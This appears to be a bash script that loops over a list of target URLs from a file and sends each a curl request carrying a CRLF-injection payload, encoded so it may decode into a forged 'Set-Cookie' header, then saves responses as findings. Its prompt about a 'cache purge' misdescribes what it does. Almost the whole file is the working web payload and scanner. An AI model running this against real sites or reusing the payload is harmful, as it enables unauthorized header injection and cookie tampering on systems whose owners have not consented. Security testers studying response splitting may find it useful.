red='\e[1;31m'
blue='\e[1;34m'
yellow='\e[1;33m'
meg='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'
reset='\e[0m'

echo "Enter the file name for cache purge"
input="lge.txt"
while IFS= read -r line
do
        echo -e ""$blue"Current target is "$line""$reset" "
        echo -e "\n"
        curl -I -k $line/%E5%98%8D%E5%98%8ASet-Cookie:cyberpunk=abcd | tee crlf_finding.txt
        echo -e "\n"
done < "$input"
